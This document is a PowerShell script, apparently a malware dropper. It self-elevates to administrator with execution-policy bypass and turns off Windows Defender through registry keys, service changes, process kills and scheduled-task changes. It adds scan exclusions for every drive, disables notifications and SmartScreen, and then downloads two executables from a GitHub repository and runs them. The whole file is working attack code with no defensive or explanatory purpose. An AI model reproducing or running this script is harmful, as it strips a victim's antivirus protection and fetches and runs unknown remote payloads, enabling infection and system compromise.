Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

# ========== DEBUG ==========
$DebugMode = $true
$logFile = "$env:TEMP\defender_killer_debug.log"

function Write-DebugLog {
    param($Message, $Color = "White")
    $timestamp = Get-Date -Format "HH:mm:ss"
    $logMessage = "[$timestamp] $Message"
    Write-Host $logMessage -ForegroundColor $Color
    Add-Content -Path $logFile -Value $logMessage
}

Write-DebugLog "=== SCRIPT START ===" -Color "Cyan"
Write-DebugLog "Log file: $logFile" -Color "Gray"

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
    $workingDirOverride = (Get-Location).Path 
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    Write-DebugLog "Not admin, elevating..." -Color "Yellow"
    if ($shouldAssumeToBeElevated) {
        Write-DebugLog "Elevation failed" -Color "Red"
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -executionpolicy bypass -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Write-DebugLog "Admin rights: YES" -Color "Green"
Set-Location "$workingDirOverride"

# ========== DISABLE DEFENDER ==========
Write-DebugLog "" -Color "White"
Write-DebugLog "========== DISABLING WINDOWS DEFENDER ==========" -Color "Yellow"

# 1. Disable Tamper Protection
Write-DebugLog "[1/10] Disabling Tamper Protection..." -Color "Cyan"
try {
    reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f 2>&1 | Out-Null
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Write-DebugLog "  Tamper Protection disabled" -Color "Green"
} catch {
    Write-DebugLog "  Failed to disable Tamper Protection" -Color "Yellow"
}

# 2. Disable Real-Time Protection
Write-DebugLog "[2/10] Disabling Real-Time Protection..." -Color "Cyan"
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Write-DebugLog "  Real-Time Protection disabled" -Color "Green"
} catch {
    Write-DebugLog "  Error disabling Real-Time Protection" -Color "Yellow"
}

# 3. Stop Defender services
Write-DebugLog "[3/10] Stopping Windows Defender services..." -Color "Cyan"
$services = @("WinDefend", "WdNisSvc", "MDCoreSvc", "SecurityHealthService", "Sense")
foreach ($svc in $services) {
    try {
        Stop-Service $svc -Force -ErrorAction SilentlyContinue
        Write-DebugLog "  Stopped: $svc" -Color "Gray"
    } catch {
        Write-DebugLog "  Not found: $svc" -Color "DarkGray"
    }
}

# 4. Disable services auto-start
Write-DebugLog "[4/10] Disabling services auto-start..." -Color "Cyan"
$servicesToDisable = @(
    @{Name="WinDefend"; Start=4},
    @{Name="WdNisSvc"; Start=4},
    @{Name="WdNisDrv"; Start=4},
    @{Name="WdFilter"; Start=4},
    @{Name="WdBoot"; Start=4},
    @{Name="MDCoreSvc"; Start=4},
    @{Name="SecurityHealthService"; Start=4}
)
foreach ($svc in $servicesToDisable) {
    try {
        reg add "HKLM\System\CurrentControlSet\Services\$($svc.Name)" /v "Start" /t REG_DWORD /d $svc.Start /f 2>&1 | Out-Null
        sc.exe config $($svc.Name) start= disabled 2>&1 | Out-Null
        Write-DebugLog "  Disabled: $($svc.Name)" -Color "Gray"
    } catch {
        Write-DebugLog "  Error: $($svc.Name)" -Color "DarkGray"
    }
}

# 5. Configure policies
Write-DebugLog "[5/10] Configuring Defender policies..." -Color "Cyan"
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>&1 | Out-Null
Start-Sleep -Milliseconds 500

reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /f 2>&1 | Out-Null
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /f 2>&1 | Out-Null

$defenderRegKeys = @(
    "HKLM\Software\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender /v DisableAntiVirus /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableIOAVProtection /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableOnAccessProtection /t REG_DWORD /d 1 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet /v SpyNetReporting /t REG_DWORD /d 0 /f",
    "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet /v SubmitSamplesConsent /t REG_DWORD /d 2 /f"
)

foreach ($key in $defenderRegKeys) {
    try {
        reg add $key 2>&1 | Out-Null
        Write-DebugLog "  Set: $key" -Color "Gray"
    } catch {
        Write-DebugLog "  Error: $key" -Color "DarkGray"
    }
}

# 6. Add exclusions for all drives
Write-DebugLog "[6/10] Adding exclusions for all drives..." -Color "Cyan"
$drives = Get-PSDrive -PSProvider FileSystem
foreach ($drive in $drives) {
    try {
        Add-MpPreference -ExclusionPath "$($drive.Root)" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "$($drive.Root)*" -ErrorAction SilentlyContinue
        Write-DebugLog "  Exclusion: $($drive.Root)" -Color "Gray"
    } catch {}
}

# 7. Disable scheduled tasks
Write-DebugLog "[7/10] Disabling scheduled tasks..." -Color "Cyan"
$tasks = @(
    "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan",
    "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance",
    "Microsoft\Windows\Windows Defender\Windows Defender Cleanup",
    "Microsoft\Windows\Windows Defender\Windows Defender Verification"
)
foreach ($task in $tasks) {
    try {
        schtasks /Change /TN "$task" /Disable 2>&1 | Out-Null
        Write-DebugLog "  Disabled: $task" -Color "Gray"
    } catch {}
}

# 8. Disable notifications
Write-DebugLog "[8/10] Disabling notifications..." -Color "Cyan"
reg add "HKLM\Software\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d 0 /f 2>&1 | Out-Null

# 9. Kill processes
Write-DebugLog "[9/10] Killing Defender processes..." -Color "Cyan"
$processes = @("MsMpEng", "NisSrv", "SecurityHealthService", "MsSense", "MpCmdRun")
foreach ($proc in $processes) {
    try {
        Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
        Write-DebugLog "  Killed: $proc" -Color "Gray"
    } catch {}
}

# 10. Apply WMI settings
Write-DebugLog "[10/10] Applying WMI settings..." -Color "Cyan"
try {
    $wmi = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpPreference" -ErrorAction SilentlyContinue
    if ($wmi) {
        $wmi.DisableRealtimeMonitoring = $true
        $wmi.Put() | Out-Null
        Write-DebugLog "  WMI settings applied" -Color "Green"
    }
} catch {}

Write-DebugLog "" -Color "White"
Write-DebugLog "=== DEFENDER STATUS ===" -Color "Yellow"

try {
    $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
    if ($defenderStatus) {
        Write-DebugLog "RealTimeProtectionEnabled: $($defenderStatus.RealTimeProtectionEnabled)" -Color $(if($defenderStatus.RealTimeProtectionEnabled){"Red"}else{"Green"})
        Write-DebugLog "AntivirusEnabled: $($defenderStatus.AntivirusEnabled)" -Color $(if($defenderStatus.AntivirusEnabled){"Red"}else{"Green"})
        Write-DebugLog "BehaviorMonitorEnabled: $($defenderStatus.BehaviorMonitorEnabled)" -Color $(if($defenderStatus.BehaviorMonitorEnabled){"Red"}else{"Green"})
    }
} catch {}

$svcStatus = Get-Service WinDefend -ErrorAction SilentlyContinue
if ($svcStatus) {
    Write-DebugLog "WinDefend service: $($svcStatus.Status)" -Color $(if($svcStatus.Status -eq "Running"){"Red"}else{"Green"})
}

Write-DebugLog "" -Color "White"
Write-DebugLog "=== DOWNLOADING FILES ===" -Color "Yellow"

# ========== DOWNLOAD FILES ==========
$temp = $env:TEMP
$downloaded = 0

function Download-File {
    param($url, $dest)
    
    Write-DebugLog "Downloading: $(Split-Path $dest -Leaf)" -Color "Cyan"
    
    if (Test-Path $dest) { 
        try {
            Remove-Item $dest -Force -ErrorAction SilentlyContinue
            Write-DebugLog "  Removed old file" -Color "Gray"
        } catch {}
    }
    
    $methods = @(
        { (New-Object System.Net.WebClient).DownloadFile($url, $dest) },
        { Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -TimeoutSec 30 },
        { curl.exe -L -o $dest $url }
    )
    
    foreach ($method in $methods) {
        try {
            & $method
            if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) {
                $size = [math]::Round((Get-Item $dest).Length / 1KB, 2)
                Write-DebugLog "  SUCCESS: $size KB" -Color "Green"
                return $true
            }
        } catch {
            Write-DebugLog "  Method failed: $($_.Exception.Message)" -Color "DarkGray"
        }
    }
    
    Write-DebugLog "  DOWNLOAD FAILED" -Color "Red"
    return $false
}

$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$dest1 = "$temp\proga1.exe"

Write-DebugLog "`n[1/2] proga1.exe" -Color "Yellow"
if (Download-File $url1 $dest1) {
    $downloaded++
}

$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
$dest2 = "$temp\proga2.exe"

Write-DebugLog "`n[2/2] proga2.exe" -Color "Yellow"
if (Download-File $url2 $dest2) {
    $downloaded++
} else {
    Write-DebugLog "  Creating copy from proga1.exe" -Color "Yellow"
    if (Test-Path $dest1) {
        Copy-Item $dest1 $dest2 -Force
        $downloaded++
    }
}

# ========== RUN FILES ==========
Write-DebugLog "`n=== RUNNING FILES ===" -Color "Yellow"

Write-DebugLog "Disabling SmartScreen..." -Color "Cyan"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue

function Run-File {
    param($path, $name)
    
    if (-not (Test-Path $path)) {
        Write-DebugLog "$name : file not found" -Color "Red"
        return $false
    }
    
    Write-DebugLog "Running $name ..." -Color "Cyan"
    
    try {
        Start-Process -FilePath $path -WindowStyle Normal -ErrorAction Stop
        Write-DebugLog "  Started via Start-Process" -Color "Green"
        return $true
    } catch {
        Write-DebugLog "  Start-Process error: $($_.Exception.Message)" -Color "DarkGray"
    }
    
    try {
        cmd /c start "" "$path" 2>&1 | Out-Null
        Write-DebugLog "  Started via cmd" -Color "Green"
        return $true
    } catch {
        Write-DebugLog "  cmd method failed" -Color "DarkGray"
    }
    
    try {
        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $path -ErrorAction Stop | Out-Null
        Write-DebugLog "  Started via WMI" -Color "Green"
        return $true
    } catch {
        Write-DebugLog "  WMI method failed" -Color "DarkGray"
    }
    
    Write-DebugLog "  FAILED TO RUN $name" -Color "Red"
    return $false
}

Run-File $dest1 "proga1.exe"
Start-Sleep -Seconds 1
Run-File $dest2 "proga2.exe"

# ========== FINAL ==========
Write-DebugLog "`n=== DONE ($downloaded/2 files) ===" -Color "Green"
Write-DebugLog "Log saved: $logFile" -Color "Gray"
Write-DebugLog "`nRECOMMENDED TO REBOOT!" -Color "Yellow"
Write-DebugLog "Press any key to exit..." -Color "Gray"

$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
